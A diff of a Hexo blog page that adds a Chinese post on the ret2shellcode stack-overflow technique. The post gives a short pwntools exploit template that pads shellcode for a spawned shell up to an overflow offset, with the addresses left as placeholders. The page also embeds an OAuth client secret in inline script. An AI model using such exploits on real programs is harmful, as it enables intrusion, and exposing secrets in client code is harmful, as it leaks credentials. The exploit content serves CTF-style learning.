@@ -6,16 +6,21 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://zhouypeng.github.io">
-  <title>Tag: hexo | zhou</title>
+  <title>pwn栈溢出-ret2shellcode | zhou</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta property="og:type" content="website">
-<meta property="og:title" content="zhou">
-<meta property="og:url" content="https://zhouypeng.github.io/tags/hexo/index.html">
+  <meta name="description" content="ret2shellcode程序中没有shell，需要我们自己写一个shell进去 基本思路ret2shellcode需要我们控制程序执行shellcode代码。即shellcode目标就是在栈上写入我们布局好的shellcode，利用ret-address返回shellcode执行我们的shellcode代码 前提：没有开启NX保护 EXP123456789101112from pwn impor">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn栈溢出-ret2shellcode">
+<meta property="og:url" content="https://zhouypeng.github.io/pwn%E6%A0%88%E6%BA%A2%E5%87%BA-ret2shellcode/index.html">
 <meta property="og:site_name" content="zhou">
+<meta property="og:description" content="ret2shellcode程序中没有shell，需要我们自己写一个shell进去 基本思路ret2shellcode需要我们控制程序执行shellcode代码。即shellcode目标就是在栈上写入我们布局好的shellcode，利用ret-address返回shellcode执行我们的shellcode代码 前提：没有开启NX保护 EXP123456789101112from pwn impor">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-07-22T02:59:46.000Z">
+<meta property="article:modified_time" content="2024-08-05T09:01:07.304Z">
 <meta property="article:author" content="zhoupeng">
+<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="zhou" type="application/atom+xml">
@@ -232,76 +237,289 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-pwn栈溢出-ret2shellcode" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2024" class="archive-year">2024</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/hexo%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA/" class="archive-article-date">
-        <time datetime="2024-04-06T08:17:18.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-04-06</time>
-</a>
-
-        </div>
-    	 
+      <header class="article-header">
   
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/hexo%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA/" target="_blank">hexo上传文件无法显示</a>
   
+    <h1 class="article-title" itemprop="name">
+      pwn栈溢出-ret2shellcode
     </h1>
   
 
 
-        <div class="article-info info-on-right">
+  
+  
+        
+        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+        </span>
+
+<a href="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA-ret2shellcode/" class="archive-article-date">
+        <time datetime="2024-07-22T02:59:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-07-22</time>
+</a>
+
+  
+  
+    
+<div style="margin-top:10px;">
+  <span class="post-time">
+    <span class="post-meta-item-icon">
+      <!-- fonts.scss -->
+      <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
+      <i class="icon-statistics"></i>
+      <span class="post-meta-item-text"> 字数统计:</span>
+      <span class="post-count">139字</span>
+    </span>
+  </span>
+
+  <span class="post-time">
+    &nbsp; | &nbsp;
+    <span class="post-meta-item-icon">
+      <i class="icon-book icon"></i>
+      <span class="post-meta-item-text"> 阅读时长≈</span>
+      <span class="post-count">1分</span>
+    </span>
+  </span>
+</div>
+
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+ 
+
+	
+		<h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>程序中没有shell，需要我们自己写一个shell进去</p>
+<h4 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h4><p>ret2shellcode需要我们控制程序执行shellcode代码。即shellcode目标就是在栈上写入我们布局好的shellcode，利用ret-address返回shellcode执行我们的shellcode代码</p>
+<p><em><strong>前提</strong></em>：没有开启NX保护</p>
+<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ret2shellcode&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.ljust((0x... + 0x...) , <span class="string">b&#x27;a&#x27;</span>) + p64(0x.....)</span><br><span class="line"><span class="comment"># p.sendline(shellcode)</span></span><br><span class="line"><span class="comment"># payload = b&#x27;a&#x27; * (0x.. + 0x..) + p64(0x.....)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="相关例题"><a href="#相关例题" class="headerlink" title="相关例题"></a>相关例题</h3><p>暂时没有典型例子</p>
+
+	
+
+
+
+    
+    <div class="page-reward">
+      <a href="javascript:void(0);" class="page-reward-btn tooltip-top" target="_self">
+        <div class="tooltip tooltip-east">
+          <span class="tooltip-item">
+            赏
+          </span>
+          <span class="tooltip-content">
+            <span class="tooltip-text">
+              <span class="tooltip-inner">
+                <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i
+                    class="icon icon-quo-right"></i></p>
+                <div class="reward-box">
+                  
+                  
+                </div>
+              </span>
+            </span>
+          </span>
+        </div>
+      </a>
+    </div>
+    
+
+    
+    <div class="declare"> 
+      <ul class="post-copyright">
+        <li>
+          <strong>本文作者：</strong>
+          zhoupeng
+        </li>
+        <li>
+          <strong>本文链接：</strong>
+          <a href="https://zhouypeng.github.io/pwn栈溢出-ret2shellcode/" title="pwn栈溢出-ret2shellcode" target="_blank">https://zhouypeng.github.io/pwn栈溢出-ret2shellcode/</a>
+        </li>
+        
+        <li>
+          <strong>版权声明： </strong>
           
+          本博客所有文章除特别声明外，均采用 <a href="https://github.com/JoeyBling/hexo-theme-yilia-plus/blob/master/LICENSE" rel="external nofollow" target="_blank">MIT</a> 许可协议。转载请注明出处！
+        </li>
+        
+      </ul>
+    </div>
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">hexo</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+    
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/hexo//" class="article-tag-list-link color5">hexo</a>
+        			<a href="/categories/pwn//" class="article-tag-list-link color4">pwn</a>
         		</li>
       		
 		</ul>
 	</div>
 
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
+    
 
     
+    
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <!-- <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a> -->
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=https://zhouypeng.github.io/pwn%E6%A0%88%E6%BA%A2%E5%87%BA-ret2shellcode/" alt="微信分享二维码"> -->
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+
+<nav id="article-nav">
+  
+    <a href="/%E6%A8%A1%E5%9D%97%E6%B3%A8%E5%85%A5-SSTI/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          模块注入-SSTI
+        
+      </div>
+    </a>
+  
+  
+    <a href="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA-ret2syscall/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">pwn栈溢出---ret2syscall</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2shellcode"><span class="toc-number">1.</span> <span class="toc-text">ret2shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF"><span class="toc-number">1.1.</span> <span class="toc-text">基本思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP"><span class="toc-number">1.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">相关例题</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
+        </div>
+        
+    </div>
+</aside>
+
+
+
+
+
+
+
+
+
+
+
+  
+  <div id="gitment-ctn"></div>
+  
+    <!-- 中文 -->
+    <link rel="stylesheet" href="/lib/gitment.css">
+    <script src="/lib/gitment.js"></script>
+  
+  <script>
+    <!-- id: "pwn栈溢出-ret2shellcode" -->
+    var gitment = new Gitment({
+      id: "20240722105946",
+      owner: 'zhouypeng',
+      repo: 'zhouypeng.github.io',
+      oauth: {
+        client_id: 'd3e8ed4ef63a952d0e7e',
+        client_secret: '219186323680e3b43d7d83f04f13d92793c37e34',
+      },
+    })
+    gitment.render('gitment-ctn')
+  </script>
+
+
+  
 
 
           </div>
@@ -342,9 +560,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: true,
 		toc_hide_index: true,
